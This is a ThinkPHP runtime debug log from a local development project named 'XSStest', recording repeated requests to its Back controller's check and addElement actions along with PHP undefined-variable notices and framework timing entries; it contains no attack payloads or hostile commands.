+[ 2016-05-03T11:47:25+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Controller/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000432s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000475s ]
+ERR: 无法加载控制器:Controller
+
+[ 2016-05-03T11:47:42+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003829s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004012s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004123s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 26 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000073s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000171s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.019464s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019538s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001692s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001752s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004336s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004426s ]
+
+[ 2016-05-03T11:47:43+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000266s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000298s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 26 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000025s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000061s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003464s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003490s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000101s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000124s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000292s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000317s ]
+
+[ 2016-05-03T11:47:50+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000317s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000423s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000468s ]
+ERR: 参数错误或者未定义:a
+
+[ 2016-05-03T11:48:45+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000324s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000461s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000505s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 26 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000038s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000099s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005191s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005250s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000106s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000130s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000484s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000521s ]
+
+[ 2016-05-03T11:48:48+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000326s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000360s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 41 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000052s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000129s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007013s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.007067s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000357s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000407s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000595s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000649s ]
+
+[ 2016-05-03T11:49:14+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000448s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000544s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000609s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 41 行.
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 42 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000043s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000093s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007597s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.007656s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000111s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000134s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000395s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000428s ]
+
+[ 2016-05-03T11:50:55+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003714s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004150s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004273s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000067s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000169s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.022888s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022973s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001322s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001395s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004147s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004241s ]
+
+[ 2016-05-03T11:50:58+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000246s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000311s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000347s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000026s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000071s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005345s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.005424s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000151s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000181s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000318s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000346s ]
+
+[ 2016-05-03T11:51:33+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003471s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004078s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004193s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003176s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003328s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003691s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003800s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004067s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004165s ]
+
+[ 2016-05-03T11:52:06+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003726s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003844s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003933s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000090s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000194s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.018267s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018350s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001738s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001810s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004193s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004290s ]
+
+[ 2016-05-03T11:52:09+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000208s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000262s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000292s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 28 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000026s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000066s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006227s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.006252s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000101s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000124s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000328s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000361s ]
+
+[ 2016-05-03T11:52:25+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004000s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003687s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003784s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 43 行.
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 44 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000120s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.018211s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018265s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001748s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001830s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001635s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001711s ]
+
+[ 2016-05-03T11:53:09+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003974s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003807s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003905s ]
+
+[ 2016-05-03T11:53:23+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003767s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003818s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003912s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 46 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000048s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000124s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.014203s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014256s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001797s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001875s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004180s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004256s ]
+
+[ 2016-05-03T11:56:54+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003709s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003912s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004028s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 47 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000102s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000193s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021809s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.021889s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003509s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003586s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004110s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004201s ]
+
+[ 2016-05-03T11:57:42+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000866s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000859s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000948s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 47 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000075s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000167s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.013961s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.014033s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000212s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000259s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001100s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001182s ]
+
+[ 2016-05-03T11:57:51+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000452s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000497s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 47 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000046s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000106s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004705s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004752s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000110s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000135s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000432s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000465s ]
+
+[ 2016-05-03T11:58:14+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003904s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003875s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003989s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 47 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000080s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000176s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.019595s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019683s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001484s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001558s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004223s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004312s ]
+
+[ 2016-05-03T11:58:21+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000475s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000830s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000949s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 47 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000046s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000092s ]
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004559s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004598s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000123s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000148s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000469s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000512s ]
+
+[ 2016-05-03T11:59:21+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/addElement
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004143s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003992s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004105s ]
